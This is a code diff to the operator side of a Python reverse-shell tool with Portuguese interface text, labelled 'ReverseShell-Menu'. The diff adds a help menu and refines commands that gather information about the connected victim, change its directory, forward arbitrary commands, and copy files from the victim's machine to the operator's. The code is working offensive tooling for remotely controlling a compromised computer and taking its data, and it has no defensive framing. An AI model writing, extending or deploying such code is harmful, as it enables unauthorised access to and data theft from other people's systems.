@@ -17,7 +17,7 @@ def criar_listener(serversocket,ip_servidor,porta):
     print('\n'+Style.BRIGHT+Back.YELLOW+Fore.BLACK+'[...]'+Style.RESET_ALL+' A espera de um Cliente')
     clientsocket,address = serversocket.accept()
     cliente_address = str(address)
-    print('\n'+Style.BRIGHT+Back.GREEN+Fore.WHITE+'[!]'+Style.RESET_ALL+' O Cliente:',cliente_address,'entrou no Servidor')
+    print('\n'+Style.BRIGHT+Back.GREEN+Fore.WHITE+'[!]'+Style.RESET_ALL+' O Cliente:',cliente_address,'entrou no Servidor\n[help - para mais informacao]')
     comandos(clientsocket, address)
 
 def servidor():
@@ -35,24 +35,33 @@ def comandos(clientsocket, address):
             clientsocket.close()
             os.system('cls')
             break
+        elif 'help' in comando:
+            _help()
         elif 'limpar' in comando:
             clientsocket.send(str.encode(comando))
             os.system('cls')
         elif 'infocliente' in comando:
             clientsocket.send(str.encode(comando))
-            rcv_data=str(clientsocket.recv(1024),'utf-8')
+            data_rcv=str(clientsocket.recv(1024),'utf-8')
             print("Cliente",address)
-            print(rcv_data)
+            print(data_rcv)
         elif 'chdir' in comando:
-            pasta=comando[3:]
-            clientsocket.send(str.encode(comando))
+            if comando[6:] == '':
+                print("[!] chdir [DIRECTORY]")
+            else:
+                clientsocket.send(str.encode(comando))
+                data_rcv=str(clientsocket.recv(1024),'utf-8')
+                print(data_rcv)
         elif 'file' in comando:
             f_nome=comando[5:]
             clientsocket.send(str.encode(comando))
-            f_data_rcv=str(clientsocket.recv(1024),'utf-8')
-            f=open("teste.txt","w")
-            f.write(f_data_rcv)
-            f.close()
+            data_rcv=str(clientsocket.recv(1024),'utf-8')
+            if 'Ficheiro Nao Encontrado' in data_rcv:
+                print(data_rcv)
+            else:
+                f=open("copia_"+f_nome,"w")
+                f.write(data_rcv)
+                f.close()
         else:
             clientsocket.send(str.encode(comando))
             msg_rcv = str(clientsocket.recv(1024), 'utf-8')
@@ -60,7 +69,25 @@ def comandos(clientsocket, address):
 
 def menu():
     os.system('cls')
-    print(" ___________________________\n|"+Style.BRIGHT+Back.GREEN+Fore.WHITE+"-----ReverseShell-Menu-----"+Style.RESET_ALL+"|\n|"+Style.BRIGHT+Back.GREEN+Fore.WHITE+"---------------------------"+Style.RESET_ALL+"|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  1 - Criar Servidor       "+Style.RESET_ALL+"|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  2 - Info                 "+Style.RESET_ALL+"|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  3 - Sair                 "+Style.RESET_ALL+"|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"___________________________"+Style.RESET_ALL+"|\n")
+    print(" ___________________________\n|"
+        +Style.BRIGHT+Back.GREEN+Fore.WHITE+"-----ReverseShell-Menu-----"+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Back.GREEN+Fore.WHITE+"---------------------------"+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  1 - Criar Servidor       "+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  2 - Info                 "+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  3 - Sair                 "+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"___________________________"+Style.RESET_ALL+"|\n")
+
+def _help():
+    print(" ______________________________________________\n|"
+        +Style.BRIGHT+Back.GREEN+Fore.WHITE+"-------------------Help-Menu------------------"+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Back.GREEN+Fore.WHITE+"----------------------------------------------"+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  limpar         ==  CMD:'CLS' BASH:'CLEAR'   "+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  infocliente    ==  Informacao do Cliente    "+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  sair           ==  Fecha Socket             "+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"                                              "+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  chdir [FOLDER] ==  Troca Diretorio          "+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  file [FILE]    ==  Obtém Dados do Ficheiro  "+Style.RESET_ALL+
+        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"______________________________________________"+Style.RESET_ALL+"|\n")
 
 def main():
     while True:
